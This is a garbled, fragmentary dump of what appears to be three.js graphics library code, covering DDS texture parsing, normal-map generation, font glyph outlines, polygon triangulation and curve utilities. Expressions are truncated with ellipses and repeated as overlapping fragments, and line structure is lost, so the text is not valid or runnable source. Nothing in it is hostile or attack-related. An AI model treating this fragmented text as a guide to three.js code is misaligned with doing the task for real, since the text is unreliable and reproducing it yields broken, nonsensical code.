... 800000;DDSD_CAPS = 0x1DDSD_HEIGHT = 0x2DDSD_WIDTH = 0x4DDSD_PITCH = 0x8DDSD_PI ...  0x10004096DDSD_MI ... 0x20000131072DDSD_LI ... 0x80000524288DDSD_DE ... x800000var DDS ... 0x1000;DDSCAPS ... X = 0x8DDSCAPS ... x4000004194304DDSCAPS ...  0x1000var DDS ... 200000;DDSCAPS ... = 0x200DDSCAPS ... = 0x400DDSCAPS ... SITIVEXDDSCAPS ... = 0x800DDSCAPS ... GATIVEX2048DDSCAPS ... SITIVEYDDSCAPS ...  0x2000DDSCAPS ... GATIVEY8192DDSCAPS ...  0x4000DDSCAPS ... SITIVEZ16384DDSCAPS ...  0x8000DDSCAPS ... GATIVEZDDSCAPS ... x2000002097152var DDP ... x20000;DDPF_AL ... S = 0x1DDPF_ALPHA = 0x2DDPF_FOURCC = 0x4DDPF_RGB = 0x40DDPF_YUV = 0x200DDPF_LU ... 0x20000return  ... << 24);value.c ...  << 24)value.c ...  << 16)value.c ... ) << 8)value.charCodeAt(0)value.charCodeAt(value. ... ) << 8)value.c ... 1) << 8value.charCodeAt(1)(value. ...  << 16)value.c ... ) << 16value.charCodeAt(2)(value. ...  << 24)value.c ... ) << 24value.charCodeAt(3)functio ... );\r\n\t\t}return  ... \r\n\t\t\t);String. ... f\r\n\t\t\t)value & 0xff(value >> 8) & 0xff(value >> 8)value >> 8(value >> 16) & 0xff(value >> 16)value >> 16(value >> 24) & 0xff(value >> 24)value >> 24functio ... y;\r\n\t\t}{\r\n\t\t\tv ... y;\r\n\t\t}var dat ... ight*4;dataLen ... eight*4width*height*4width*heightvar src ... ngth );srcBuff ... ength )var byt ... ngth );byteArr ... ength )var dst = 0;dst = 0var src = 0;src = 0y < heighty++var y = 0x < widthx++var b = ... r[src];b = srcBuffer[src]srcBuffer[src]src++;src++var g = ... r[src];g = srcBuffer[src]var r = ... r[src];r = srcBuffer[src]var a = ... r[src];a = srcBuffer[src]byteArray[dst] = r;byteArray[dst] = rbyteArray[dst]dst++;dst++byteArray[dst] = g;byteArray[dst] = gbyteArray[dst] = b;byteArray[dst] = bbyteArray[dst] = a;byteArray[dst] = areturn byteArray;var FOU ... DXT1");FOURCC_ ... "DXT1")fourCCT ... "DXT1")DXT1var FOU ... DXT3");FOURCC_ ... "DXT3")fourCCT ... "DXT3")DXT3var FOU ... DXT5");FOURCC_ ... "DXT5")fourCCT ... "DXT5")DXT5var hea ... t = 31;headerLengthInt = 31var off_magic = 0;off_magic = 0var off_size = 1;off_size = 1var off_flags = 2;off_flags = 2var off_height = 3;off_height = 3var off_width = 4;off_width = 4var off ... nt = 7;off_mipmapCount = 7var off ... s = 20;off_pfFlags = 20var off ... C = 21;off_pfFourCC = 21var off ... t = 22;off_RGBBitCount = 22var off ... k = 23;off_RBitMask = 23var off ... k = 24;off_GBitMask = 24var off ... k = 25;off_BBitMask = 25var off ... k = 26;off_ABitMask = 26var off_caps = 27;off_caps = 27var off_caps2 = 28;off_caps2 = 28var off_caps3 = 29;off_caps3 = 29var off_caps4 = 30;off_caps4 = 30var hea ... hInt );header  ... thInt )new Int ... thInt )if ( he ... \r\n\r\n\t\t}header[ ... S_MAGICheader[ off_magic ]"ImageU ... header"ImageUtils.parseDDS(): Invalid magic number in DDS header: Invalid magic number in DDS headerreturn dds;! heade ... _FOURCC! heade ... Flags ]header[ ... Flags ]console ... ode" );console ... code" )"ImageU ... C code"ImageUtils.parseDDS(): Unsupported format, must contain a FourCC code: Unsupported format, must contain a FourCC codevar blockBytes;var fou ... urCC ];fourCC  ... ourCC ]header[ ... ourCC ]var isR ...  false;isRGBAU ... = falseswitch  ... \t}\r\n\t\t}case FO ... \tbreak;blockBytes = 8;blockBytes = 8dds.for ... Format;dds.for ... _FormatblockBytes = 16;blockBytes = 16default ... \r\n\t\t\t\t}if( hea ... \r\n\t\t\t\t}header[ ... f000000header[ ... k]&0xffheader[ ... &0xff00header[ ... xff0000header[ ... t] ==32header[ ... tCount]header[off_RBitMask]header[off_GBitMask]header[off_BBitMask]header[off_ABitMask]4278190080isRGBAU ... = true;isRGBAU ...  = trueblockBytes = 64;blockBytes = 64dds.for ... AFormatconsole ... CC ) );console ... rCC ) )"ImageU ... code: "ImageUtils.parseDDS(): Unsupported FourCC code: : Unsupported FourCC code: int32To ... ourCC )dds.mipmapCount = 1;dds.mipmapCount = 1header[ ... = falseheader[ ... APCOUNTheader[ off_flags ]loadMip ... = falsedds.mip ... nt ] );dds.mip ... unt ] )Math.ma ... unt ] )header[ ... Count ]dds.isC ...  false;dds.isC ... : falseheader[ ... : falseheader[ ... CUBEMAPheader[ off_caps2 ]dds.wid ... idth ];dds.wid ... width ]header[ off_width ]dds.hei ... ight ];dds.hei ... eight ]header[ off_height ]var dat ...  ] + 4;dataOff ... e ] + 4header[ ... e ] + 4header[ off_size ]var wid ... .width;width = dds.widthvar hei ... height;height = dds.heightvar fac ...  6 : 1;faces = ... ? 6 : 1dds.isC ... ? 6 : 1face < facesface ++var face = 0face = 0if( isR ... \r\n\t\t\t\t}var byt ... ight );byteArr ... eight )loadARG ... eight )var dat ... length;dataLen ... .lengthbyteArray.lengthvar dat ... kBytes;dataLen ... ckBytesMath.ma ... ckBytesMath.ma ... t ) / 4Math.ma ... h ) / 4Math.max( 4, width )var mip ... ight };mipmap  ... eight }{ "data ... eight }"data": byteArray"width": width"height": heightdds.mip ... pmap );dds.mip ... ipmap )dds.mipmaps.pushdataOff ... Length;dataOff ... aLengthwidth = ... 5, 1 );width = ... .5, 1 )Math.ma ... .5, 1 )width * 0.5height  ... 5, 1 );height  ... .5, 1 )height * 0.5width = dds.width;height = dds.height;var cro ... \r\n\r\n\t\t}cross = ... \r\n\r\n\t\t}return  ...  0 ] ];[ a[ 1  ... [ 0 ] ]a[ 1 ]  ...  b[ 1 ]a[ 1 ] * b[ 2 ]a[ 1 ]b[ 2 ]a[ 2 ] * b[ 1 ]a[ 2 ]b[ 1 ]a[ 2 ]  ...  b[ 2 ]a[ 2 ] * b[ 0 ]a[ 0 ] * b[ 2 ]a[ 0 ]  ...  b[ 0 ]a[ 0 ] * b[ 1 ]a[ 1 ] * b[ 0 ]var sub ... \r\n\r\n\t\t}subtrac ... \r\n\r\n\t\t}return  ...  2 ] ];[ a[ 0  ... [ 2 ] ]a[ 0 ] - b[ 0 ]a[ 1 ] - b[ 1 ]a[ 2 ] - b[ 2 ]var nor ... \r\n\r\n\t\t}normali ... \r\n\r\n\t\t}var l = ...  2 ] );l = Mat ... [ 2 ] )Math.sq ... [ 2 ] )a[ 0 ]  ...  a[ 2 ]a[ 0 ]  ...  a[ 1 ]a[ 0 ] * a[ 0 ]a[ 1 ] * a[ 1 ]a[ 2 ] * a[ 2 ]return  ...  / l ];[ a[ 0  ... ] / l ]a[ 0 ] / la[ 1 ] / la[ 2 ] / ldepth = depth | 1;depth = depth | 1depth | 1width = image.widthcanvas. ...  width;canvas.width = widthcanvas. ...  heightvar dat ... ).data;data =  ...  ).datacontext ...  ).datacontext.getImageDatavar ima ... ight );imageDa ... eight )context ... ageDatavar out ... a.data;output  ... ta.dataimageData.datay ++var ly  ...  y - 1;ly = y  ... : y - 1y - 1 < ... : y - 1y - 1 < 0y - 1var uy  ...  y + 1;uy = y  ... : y + 1y + 1 > ... : y + 1y + 1 > height - 1y + 1height - 1var lx  ...  x - 1;lx = x  ... : x - 1x - 1 < ... : x - 1x - 1 < 0x - 1var ux  ...  x + 1;ux = x  ... : x + 1x + 1 > ... : x + 1x + 1 > width - 1x + 1width - 1var points = [];points = []var ori ... epth ];origin  ... depth ][ 0, 0, ... depth ]data[ ( ... * depthdata[ ( ... ] / 255data[ ( ... ) * 4 ]( y * w ... x ) * 4( y * width + x )y * width + xy * widthpoints. ... th ] );points. ... pth ] )points.push[ - 1,  ... depth ]( y * width + lx )y * width + lx( ly *  ... x ) * 4( ly * width + lx )ly * width + lxly * width[ 0, -  ... depth ]( ly * width + x )ly * width + x[  1, - ... depth ]( ly * width + ux )ly * width + ux[ 1, 0, ... depth ]( y * width + ux )y * width + ux[ 1, 1, ... depth ]( uy *  ... x ) * 4( uy * width + ux )uy * width + uxuy * width[ 0, 1, ... depth ]( uy * width + x )uy * width + x( uy * width + lx )uy * width + lxnum_poi ... .lengthi < num_pointsvar v1  ... s[ i ];v1 = points[ i ]var v2  ... ints ];v2 = po ... oints ]points[ ... oints ]( i + 1 ... _pointsv1 = su ... igin );v1 = su ... rigin )subtrac ... rigin )v2 = su ... igin );v2 = su ... rigin )normals ...  ) ) );normals ... 2 ) ) )normali ...  v2 ) )cross( v1, v2 )var nor ... 0, 0 ];normal = [ 0, 0, 0 ]i < normals.lengthnormal[ ... ][ 0 ];normal[ ...  ][ 0 ]normal[ 0 ]normals[ i ][ 0 ]normal[ ... ][ 1 ];normal[ ...  ][ 1 ]normal[ 1 ]normals[ i ][ 1 ]normal[ ... ][ 2 ];normal[ ...  ][ 2 ]normal[ 2 ]normals[ i ][ 2 ]normal[ ... length;normal[ ... .lengthvar idx ...  ) * 4;idx = ( ... x ) * 4output[ ...  ) | 0;output[ ... 5 ) | 0output[ idx ]( ( nor ... 5 ) | 0( ( nor ... * 255 )( norma ... 0 * 255( norma ... ) / 2.0( norma ... + 1.0 )normal[ 0 ] + 1.0output[ idx + 1 ]idx + 1normal[ 1 ] + 1.0output[ idx + 2 ]idx + 2( norma ... 5 ) | 0( norma ... * 255 )normal[ 2 ] * 255output[ ...  = 255;output[ ... ] = 255output[ idx + 3 ]idx + 3context.putImageDatavar siz ... height;size =  ...  heightwidth * heightvar dat ... size );data =  ...  size )new Uin ...  size )3 * sizevar r = ...  255 );r = Mat ... * 255 )color.r * 255var g = ...  255 );g = Mat ... * 255 )color.g * 255var b = ...  255 );b = Mat ... * 255 )color.b * 255i < sizedata[ i ... \t  = r;data[ i * 3 ] \t  = rdata[ i * 3 ]data[ i ...  ] = g;data[ i ... 1 ] = gdata[ i * 3 + 1 ]i * 3 + 1data[ i ...  ] = b;data[ i ... 2 ] = bdata[ i * 3 + 2 ]i * 3 + 2var tex ... rmat );texture ... ormat )new THR ... ormat )THREE.SceneUtilscreateM ... lObjectvar gro ... ct3D();group = ... ect3D()l = materials.lengthgroup.a ...  ] ) );group.a ... i ] ) )group.addnew THR ... [ i ] )return group;detach  ... ;\r\n\r\n\t}child.a ... orld );child.a ... World )child.applyMatrixparent.matrixWorldparent. ... hild );parent. ... child )parent.removescene.add( child );scene.add( child )scene.addattach: ... ;\r\n\r\n\t}matrixW ... trix4()matrixW ... orld );matrixW ... World )matrixW ... Inversechild.a ... erse );child.a ... verse )scene.r ... hild );scene.r ... child )scene.removeparent.add( child );parent.add( child )THREE.FontUtils{\r\n\r\n\tf ... \t}\r\n\r\n}faces : {}face : "helvetiker"helvetikerweight: "normal"style : "normal"size : 150divisions : 10getFace ... ;\r\n\r\n\t}return  ... tyle ];this.fa ... style ]this.fa ... eight ]this.fa ... .face ]this.facethis.weightthis.styleloadFac ... ;\r\n\r\n\t}var fam ... Case();family  ... rCase()data.fa ... rCase()data.fa ... werCasedata.familyNamevar Thr ... = this;ThreeFont = thisThreeFo ...  || {};ThreeFo ... ] || {}ThreeFo ... amily ]ThreeFont.facesThreeFo ... eight ]data.cssFontWeightThreeFo ... = data;ThreeFo ...  = dataThreeFo ... Style ]data.cssFontStylevar fac ... = data;face =  ...  = datareturn data;drawTex ... ;\r\n\r\n\t}var cha ... s = [];characterPts = []allPts = []face =  ... tFace()this.getFace()this.getFacescale = ... olutionthis.si ... olutionface.resolutionchars = ... t( '' )String( ... t( '' )String( text ).splitString( text )chars.lengthvar fontPaths = [];fontPaths = []var pat ... Path();path =  ... .Path()new THREE.Path()THREE.Pathvar ret ... path );ret = t ...  path )this.ex ...  path )this.ex ... hPointschars[ i ]offset  ... offset;offset += ret.offsetret.offsetfontPat ... path );fontPat ... .path )fontPaths.pushret.pathvar wid ... et / 2;width = offset / 2offset / 2return  ... idth };{ paths ... width }paths : fontPathsoffset : widthextract ... h};\r\n\t}functio ... h};\r\n\t}{\r\n\r\n\t\t ... h};\r\n\t}var pts = [];pts = []var i,  ...  '?' ];glyph = ... [ '?' ]face.gl ... [ '?' ]face.glyphs[ c ]face.glyphsface.glyphs[ '?' ]if ( !g ... return;!glyphif ( gl ... \t}\r\n\t\t}glyph.ooutline ...  ' ) );outline ... ' ' ) )glyph._ ... ' ' ) )glyph._cachedOutline( glyph ... ' ' ) )glyph._ ... ( ' ' )glyph.o.split( ' ' )glyph.o.splitoutline.lengthscaleX = scale;scaleX = scalescaleY = scale;scaleY = scaleaction  ... i ++ ];action  ...  i ++ ]outline[ i ++ ]switch( ... \r\n\t\t\t\t}case 'm ... \tbreak;x = out ... offset;x = out ...  offsetoutline ...  offsetoutline ...  scaleXoutline[ i++ ]y = out ... scaleY;y = out ...  scaleYoutline ...  scaleYpath.moveTo( x, y );path.moveTo( x, y )path.moveTocase 'l ... \tbreak;path.lineTo(x,y);path.lineTo(x,y)path.lineTocase 'q ...  break;cpx  =  ... offset;cpx  =  ...  offsetcpy  =  ... scaleY;cpy  =  ...  scaleYcpx1 =  ... offset;cpx1 =  ...  offsetcpy1 =  ... scaleY;cpy1 =  ...  scaleYpath.qu ... , cpy);path.qu ... x, cpy)path.qu ... CurveTolaste = ...  - 1 ];laste = ... h - 1 ]pts[ pt ... h - 1 ]pts.length - 1pts.lengthif ( la ... \t\t\t\t  }{\r\n\r\n\t\t ... \t\t\t\t  }cpx0 = laste.x;cpx0 = laste.xlaste.xcpy0 = laste.y;cpy0 = laste.ylaste.yfor ( i ... \t\t\t\t  }i2 <= divisionsi2 ++i2 = 1, ... visionsi2 = 1divisio ... visionsthis.divisionsvar t = ... isions;t = i2 / divisionsi2 / divisionsvar tx  ...  cpx );tx = TH ... , cpx )THREE.S ... , cpx )THREE.Shape.Utils.b2THREE.Shape.UtilsTHREE.Shapevar ty  ...  cpy );ty = TH ... , cpy )THREE.S ... , cpy )case 'b ... \tbreak;cpy1 =  ... -scaleYoutline ... -scaleY-scaleYcpx2 =  ... offset;cpx2 =  ...  offsetcpy2 =  ... scaleY;cpy2 =  ... -scaleYpath.be ... cpy2 );path.be ...  cpy2 )path.bezierCurveToif ( la ... \n\t\t\t\t\t}for ( i ... \t\t\t\t\t\t}THREE.Shape.Utils.b3return  ... :path};{ offse ... h:path}offset: ... a*scaleglyph.ha*scaleglyph.hapath:pathTHREE.F ... s;\r\n\r\n}THREE.F ... eShapesfunctio ... s;\r\n\r\n}{\r\n\r\n\t/ ... s;\r\n\r\n}var siz ...  : 100;size =  ... e : 100paramet ... e : 100parameters.sizevar cur ... nts: 4;curveSe ... ents: 4paramet ... ents: 4paramet ... egmentsvar fon ... tiker";font =  ... etiker"paramet ... etiker"parameters.fontvar wei ... ormal";weight  ... normal"paramet ... normal"parameters.weightvar sty ... ormal";style = ... normal"parameters.styleTHREE.F ... = size;THREE.F ...  = sizeTHREE.FontUtils.sizeTHREE.F ... gments;THREE.F ... egmentsTHREE.F ... visionsTHREE.F ... = font;THREE.F ...  = fontTHREE.FontUtils.faceTHREE.F ... weight;THREE.F ...  weightTHREE.F ... .weightTHREE.F ...  style;THREE.F ... = styleTHREE.F ... s.stylevar dat ... text );data =  ...  text )THREE.F ...  text )THREE.F ... rawTextvar pat ... .paths;paths = data.pathsdata.pathsvar shapes = [];shapes = []pl = paths.lengthpaths.lengthArray.p ... es() );Array.p ... pes() )paths[  ... hapes()paths[ p ].toShapespaths[ p ]return shapes;( funct ... Utils);( funct ... tUtils)( funct ... ;\r\n\r\n})var EPS ... 000001;EPSILON ... 00000011.0E-10process ... ;\r\n\r\n\t}var n = ... length;n = contour.lengthcontour.lengthif ( n  ... n null;var res ... s = [];verts = []vertIndices = []var u, v, w;area( c ... ) > 0.0area( contour )for ( v ...  ] = v;v < nv++verts[ v ] = v;verts[ v ] = vverts[ v ]for ( v ...  ) - v;verts[  ...  ) - v;verts[  ... 1 ) - v( n - 1 ) - v( n - 1 )n - 1var nv = n;nv = nvar count = 2 * nv;count = 2 * nv2 * nvfor( v  ... \r\n\r\n\t\t}nv > 2v = nv - 1nv - 1( count-- ) <= 0( count-- )count--console ... on!" );console ... gon!" )"Warnin ... lygon!"Warning, unable to triangulate polygon!if ( in ... ndices;return vertIndices;u = v;u = vif ( nv ...  u = 0;nv <= uu = 0;v = u + 1;v = u + 1u + 1if ( nv ...  v = 0;nv <= vv = 0;w = v + 1;w = v + 1if ( nv ...  w = 0;nv <= ww = 0;w = 0if ( sn ... \n\r\n\t\t\t}snip( c ... verts )var a, b, c, s, t;a = verts[ u ];a = verts[ u ]verts[ u ]b = verts[ v ];b = verts[ v ]c = verts[ w ];c = verts[ w ]verts[ w ]result. ...  ] ] );result. ... c ] ] )result.push[ conto ... [ c ] ]contour[ a ]contour[ b ]contour[ c ]vertInd ...  ] ] );vertInd ... w ] ] )vertIndices.push[ verts ... [ w ] ]for( s  ... \r\n\t\t\t\t}t < nvs++, t++s++t++s = v, t = v + 1s = vt = v + 1verts[  ... s[ t ];verts[  ... ts[ t ]verts[ s ]verts[ t ]nv--;nv--count = 2 * nv;var are ... \r\n\r\n\t};area =  ... ;\r\n\r\n\t}var a = 0.0;a = 0.0q < np = q++q++var p = n - 1, q = 0p = n - 1q = 0a += co ...  p ].y;a += co ... [ p ].ycontour ... [ p ].ycontour ... [ q ].ycontour[ p ].xcontour[ p ]contour[ q ].ycontour[ q ]contour[ q ].xcontour[ p ].yreturn a * 0.5;a * 0.5var sni ... \r\n\r\n\t};snip =  ... ;\r\n\r\n\t}var p;var ax, ay, bx, by;var cx, cy, px, py;ax = co ...  ] ].x;ax = co ... u ] ].xcontour ... u ] ].xcontour ... [ u ] ]ay = co ...  ] ].y;ay = co ... u ] ].ycontour ... u ] ].ybx = co ...  ] ].x;bx = co ... v ] ].xcontour ... v ] ].xcontour ... [ v ] ]by = co ...  ] ].y;by = co ... v ] ].ycontour ... v ] ].ycx = co ...  ] ].x;cx = co ... w ] ].xcontour ... w ] ].xcontour ... [ w ] ]cy = co ...  ] ].y;cy = co ... w ] ].ycontour ... w ] ].yif ( EP ...  false;EPSILON ... x-ax)))(((bx-a ... x-ax)))((bx-ax ... cx-ax))((bx-ax)*(cy-ay))(bx-ax)*(cy-ay)(bx-ax)bx-ax(cy-ay)cy-ay((by-ay)*(cx-ax))(by-ay)*(cx-ax)(by-ay)by-ay(cx-ax)cx-axvar aX, ... cX, cY;var apx ... x, cpy;var cCR ... ROSSbp;aX = cx - bx;aX = cx - bxcx - bxaY = cy - by;aY = cy - bycy - bybX = ax - cx;bX = ax - cxax - cxbY = ay - cy;bY = ay - cyay - cycX = bx - ax;cX = bx - axbx - axcY = by - ay;cY = by - ayby - ayfor ( p ... \r\n\r\n\t\t}p < np++px = co ... p ] ].xcontour ... p ] ].xcontour ... [ p ] ]verts[ p ]py = co ... p ] ].ycontour ... p ] ].y( (px = ... = cy) )( (px = ... = by) )( (px = ... = ay) )(px === ... === ay)(px === ax)px === ax(py === ay)py === ay(px === ... === by)(px === bx)px === bx(py === by)py === by(px === ... === cy)(px === cx)px === cx(py === cy)py === cyapx = px - ax;apx = px - axpx - axapy = py - ay;apy = py - aypy - aybpx = px - bx;bpx = px - bxpx - bxbpy = py - by;bpy = py - bypy - bycpx = px - cx;cpx = px - cxpx - cxcpy = py - cy;cpy = py - cypy - cyaCROSSb ... aY*bpx;aCROSSb ...  aY*bpxaX*bpy - aY*bpxaX*bpyaY*bpxcCROSSa ... cY*apx;cCROSSa ...  cY*apxcX*apy - cY*apxcX*apycY*apxbCROSSc ... bY*cpx;bCROSSc ...  bY*cpxbX*cpy - bY*cpxbX*cpybY*cpxif ( (a ...  false;(aCROSS ... PSILON)aCROSSbp >= -EPSILON-EPSILON(bCROSS ... PSILON)bCROSScp >= -EPSILON(cCROSS ... PSILON)cCROSSap >= -EPSILONnamespa ... rocess;namespa ... processnamespa ... ngulatenamespa ... = area;namespa ...  = areanamespa ... te.areareturn namespace;self._t ... Face };self._t ... dFace }self._typeface_js{ faces ... dFace }faces:  ... s.facesTHREE.F ... s.facesloadFac ... oadFaceTHREE.F ... oadFaceTHREE.t ... ace_js;THREE.t ... face_jsTHREE.typeface_jsTHREE.C ... {\r\n\r\n};THREE.C ...  {\r\n\r\n}THREE.Curvefunction () {\r\n\r\n}{\r\n\r\n}THREE.C ... l;\r\n\r\n}THREE.C ... etPoint{\r\n\r\n\tc ... l;\r\n\r\n}console ... ed!" );console ... ted!" )"Warnin ... ented!"Warning, getPoint() not implemented!Warning, getPoint not implemented!THREE.C ... PointAtvar t = ... g( u );t = thi ... ng( u )this.ge ... ng( u )this.getUtoTmappingreturn  ... t( t );this.getPoint( t )THREE.C ... s;\r\n\r\n}THREE.C ... tPoints{\r\n\r\n\ti ... s;\r\n\r\n}if ( !d ... ns = 5;!divisionsdivisions = 5;divisions = 5var d, pts = [];for ( d ... ;\r\n\r\n\t}d <= divisionspts.pus ... ns ) );pts.pus ... ons ) )pts.pushthis.ge ... sions )d / divisionsreturn pts;THREE.C ... dPointsthis.getPointAtTHREE.C ... ];\r\n\r\n}THREE.C ... tLength{\r\n\r\n\tv ... ];\r\n\r\n}var len ... gths();lengths ... ngths()this.getLengths()this.getLengthsreturn  ...  - 1 ];lengths ... h - 1 ]lengths.length - 1lengths.lengthTHREE.C ... .\r\n\r\n};THREE.C ... t.\r\n\r\n}THREE.C ... Lengthsfunctio ... t.\r\n\r\n}{\r\n\r\n\ti ... t.\r\n\r\n}if ( !d ... ): 200;divisio ... ): 200;divisio ... s): 200(this._ ... s): 200(this._ ... isions)this.__ ... visionsthis.ca ... sUpdatethis.ca ... s + 1 )this.cacheArcLengths( this. ... s + 1 )this.ca ... ons + 1divisions + 1!this.needsUpdatereturn  ... engths;var cache = [];cache = []var cur ... t( 0 );last =  ... nt( 0 )this.getPoint( 0 )var p, sum = 0;sum = 0cache.push( 0 );cache.push( 0 )cache.pushfor ( p ... ;\r\n\r\n\t}p <= divisionsp = 1current ... ions );current ... sions )p / divisionssum +=  ... last );sum +=  ...  last )current ...  last )current.distanceTocache.push( sum );cache.push( sum )last = current;last = currentthis.ca ...  cache;this.ca ... = cachereturn cache;THREE.C ... ();\r\n};THREE.C ... s();\r\n}functio ... s();\r\n}{\r\n\tthi ... s();\r\n}this.getLengths();THREE.C ... t;\r\n\r\n}THREE.C ... mappingvar arc ... gths();arcLeng ... ngths()var i = ... length;il = ar ... .lengtharcLengths.lengthvar targetArcLength;if ( di ... ;\r\n\r\n\t}targetA ... stance;targetA ... istancetargetA ...  - 1 ];targetA ... l - 1 ]u * arc ... l - 1 ]arcLengths[ il - 1 ]il - 1var low ... arison;low = 0high = il - 1while ( ... }\r\n\r\n\t}low <= highi = Mat ...  / 2 );i = Mat ... ) / 2 )low + ( ... w ) / 2( high - low ) / 2compari ... Length;compari ... cLengtharcLeng ... cLengtharcLengths[ i ]comparison < 0low = i + 1;low = i + 1comparison > 0high = i - 1;high = i - 1high = i;high = ii = high;i = highvar t = ...  - 1 );t = i / ( il - 1 )i / ( il - 1 )( il - 1 )var len ... s[ i ];lengthB ... hs[ i ]var len ...  + 1 ];lengthA ... i + 1 ]arcLengths[ i + 1 ]var seg ... Before;segment ... hBeforelengthA ... hBeforevar seg ... Length;segment ... tLength( targe ... tLength( targe ... efore )targetA ... hBeforevar t = ... l -1 );t = ( i ... il -1 )( i + s ... il -1 )( i + s ... ction )i + segmentFraction( il -1 )il -1THREE.C ... Tangentvar delta = 0.0001;delta = 0.0001var t1 = t - delta;t1 = t - deltat - deltavar t2 = t + delta;t2 = t + deltat + deltaif ( t1 ... t1 = 0;t1 < 0t1 = 0;t1 = 0if ( t2 ... t2 = 1;t2 > 1t2 = 1;t2 = 1var pt1 ... ( t1 );pt1 = t ... t( t1 )this.getPoint( t1 )var pt2 ... ( t2 );pt2 = t ... t( t2 )this.getPoint( t2 )var vec ... b(pt1);vec = p ... ub(pt1)pt2.clone().sub(pt1)pt2.clone().subpt2.clone()pt2.clonereturn  ... lize();vec.normalize()vec.normalizeTHREE.C ... ngentAtthis.getTangent( t )this.getTangentTHREE.Curve.Utilstangent ... ;\r\n\r\n\t}tangent ... cBezierreturn  ... - p1 );2 * ( 1 ...  - p1 )2 * ( 1 ...  - p0 )2 * ( 1 - t )( p1 - p0 )p1 - p02 * t * ( p2 - p1 )2 * t( p2 - p1 )p2 - p1tangent ... p3;\r\n\t}functio ... p3;\r\n\t}{\r\n\r\n\t\t ... p3;\r\n\t}return  ... t * p3;-3 * p0 ...  t * p3-3 * p0 ...  t * p2-3 * p0 ... * (1-t)-3 * p0 ... (1 - t)-3 * p0 * (1 - t)-3 * p0-3(1 - t)3 * p1  ... * (1-t)3 * p1 * (1 - t)3 * p1(1-t)1-t6 *t *p1 * (1-t)6 *t *p16 *t6 * t *  p2 * (1-t)6 * t *  p26 * t3 * t * t * p23 * t * t3 * t3 * t * t * p3var h00 ...  6 * t;h00 = 6 ... - 6 * t6 * t * t - 6 * t6 * t * tvar h10 ...  t + 1;h10 = 3 ... * t + 13 * t * ... * t + 13 * t * t - 4 * t4 * tvar h01 ...  6 * t;h01 = - ... + 6 * t-6 * t * t + 6 * t-6 * t * t-6 * tvar h11 ...  2 * t;h11 = 3 ... - 2 * t3 * t * t - 2 * treturn  ...  + h11;h00 + h ... 1 + h11h00 + h10 + h01h00 + h10interpo ... ;\r\n\r\n\t}var v1  ...  * 0.5;var t2 = t * t;t2 = t * tt * tvar t3 = t * t2;t3 = t * t2t * t2( 2 * p ...  t + p1( 2 * p ...  v0 * t( 2 * p ...  ) * t2( 2 * p ...  ) * t3( 2 * p ...  + v1 )2 * p1  ... v0 + v12 * p1 - 2 * p2 + v02 * p1 - 2 * p22 * p12 * p2- 3 * p ... v0 - v1- 3 * p ...  2 * v0- 3 * p1 + 3 * p2- 3 * p13 * p2THREE.C ... r;\r\n\r\n}THREE.Curve.create{\r\n\r\n\tc ... r;\r\n\r\n}constru ... type );constru ... otype )constru ... ototypeconstru ... ntFunc;constru ... intFuncconstru ... etPointreturn constructor;THREE.C ... ath\r\n};THREE.C ... path\r\n}THREE.CurvePathfunctio ... path\r\n}{\r\n\r\n\tt ... path\r\n}this.curves = [];this.curves = []this.curvesthis.bends = [];this.bends = []this.bendsthis.autoCloseTHREE.C ... ype.addthis.cu ... urve );this.cu ... curve )this.curves.pushTHREE.C ... nection{\r\n\t//  ... path\r\n}THREE.C ... \r\n\t\r\n};THREE.C ... }\r\n\t\r\n}THREE.C ... osePathfunctio ... }\r\n\t\r\n}{\r\n\t//  ... }\r\n\t\r\n}var sta ... int(0);startPo ... oint(0)this.cu ... oint(0)this.cu ... etPointthis.curves[0]var end ... int(1);endPoin ... oint(1)this.cu ... oint(1)this.cu ... ngth-1]this.curves.length-1this.curves.lengthif (!st ...  );\r\n\t}!startP ... dPoint)startPo ... dPoint)startPoint.equals{\r\n\t\tth ...  );\r\n\t}this.cu ... int) );this.cu ... oint) )new THR ... tPoint)THREE.LineCurveTHREE.C ... d\r\n\r\n};THREE.C ... <d\r\n\r\n}functio ... <d\r\n\r\n}{\r\n\r\n\tv ... <d\r\n\r\n}var d = ... ngth();d = t * ... ength()t * this.getLength()var cur ... gths();curveLe ... ngths()this.ge ... ngths()this.getCurveLengthsvar i = ...  curve;while ( ... ;\r\n\r\n\t}i < cur ... .lengthcurveLengths.lengthif ( cu ... k;\r\n\t\t}curveLe ...  ] >= dcurveLengths[ i ]{\r\n\r\n\t\t ... k;\r\n\t\t}diff =  ...  ] - d;diff =  ... i ] - dcurveLe ... i ] - dcurve = ... s[ i ];curve = ... es[ i ]this.curves[ i ]var u = ... ngth();u = 1 - ... ength()1 - dif ... ength()diff /  ... ength()curve.getLength()curve.getLengthreturn  ... t( u );curve.g ... At( u )curve.getPointAti ++;lens =  ... ngths()lens[ l ... h - 1 ]lens.length - 1lens.lengththis.cacheLengthsvar len ... ms = 0;lengths = []sums = 0for ( i ... ;\r\n\r\n\t}sums += ... ngth();sums += ... ength()this.cu ... ength()this.cu ... tLengthlengths ... sums );lengths.push( sums )lengths.pushthis.ca ... engths;this.ca ... lengthsreturn lengths;THREE.C ... dingBoxvar poi ... ints();points  ... oints()this.getPoints()this.getPointsvar max ... , maxZ;var min ... , minZ;maxX =  ... FINITY;maxX =  ... NFINITYmaxY =  ... NFINITYminX =  ... FINITY;minX =  ... NFINITYminY =  ... NFINITYvar p, i, il, sum;var v3  ... ector3;v3 = po ... Vector3points[ ... Vector3sum = v ... tor2();sum = v ... ctor2()v3 ? ne ... ctor2()p = points[ i ];p = points[ i ]if ( p. ...  = p.x;p.x > maxXmaxX = p.x;maxX = p.xp.x < minXminX = p.x;minX = p.xif ( p. ...  = p.y;p.y > maxYmaxY = p.y;maxY = p.yp.y < minYminY = p.y;minY = p.yif ( v3 ... \r\n\r\n\t\t}if ( p. ...  = p.z;p.z > maxZmaxZ = p.z;maxZ = p.zp.z < minZminZ = p.z;minZ = p.zsum.add( p );sum.add( p )sum.addvar ret ... \r\n\r\n\t};ret = { ... Y\r\n\r\n\t}{\r\n\r\n\t\t ... Y\r\n\r\n\t}minX: minXminY: minYmaxX: maxXmaxY: maxYif ( v3 ... ;\r\n\r\n\t}ret.maxZ = maxZ;ret.maxZ = maxZret.maxZret.minZ = minZ;ret.minZ = minZret.minZreturn ret;var pts ... true );pts = t ...  true )this.ge ...  true )return  ...  pts );this.cr ... ( pts )this.createGeometrycreateS ... eometrythis.getSpacedPointsTHREE.C ... y;\r\n\r\n}functio ... y;\r\n\r\n}{\r\n\r\n\tv ... y;\r\n\r\n}i < points.lengthgeometr ... | 0) );geometr ... || 0) )new THR ... z || 